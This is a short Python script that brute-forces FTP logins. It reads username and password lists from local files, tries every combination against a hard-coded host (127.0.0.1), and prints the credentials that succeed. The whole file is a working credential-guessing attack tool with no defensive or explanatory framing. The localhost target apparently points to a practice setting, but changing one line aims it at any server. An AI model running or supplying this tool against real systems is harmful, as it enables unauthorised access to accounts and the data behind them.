from ftplib import FTP

def check_credential(hostName,userName,password):
    ftp = FTP(hostName)
    try:
        ftp.login(userName,password)
        print("successfully connected to")
        print("{0}  {1}:{2}".format(hostName,userName,password))
    except Exception :
        pass
def get_user_names():
    f = open('user_names', 'r')
    user_names = f.read()
    user_names = user_names.rsplit('\n')
    return user_names
def get_passwords():
    f = open('passwords', 'r')
    passwords = f.read()
    passwords = passwords.rsplit('\n')
    return passwords
user_names=get_user_names()
passwords=get_passwords()
hostName='127.0.0.1'
for user_name in user_names:
    for password in passwords:
        check_credential(hostName,user_name,password)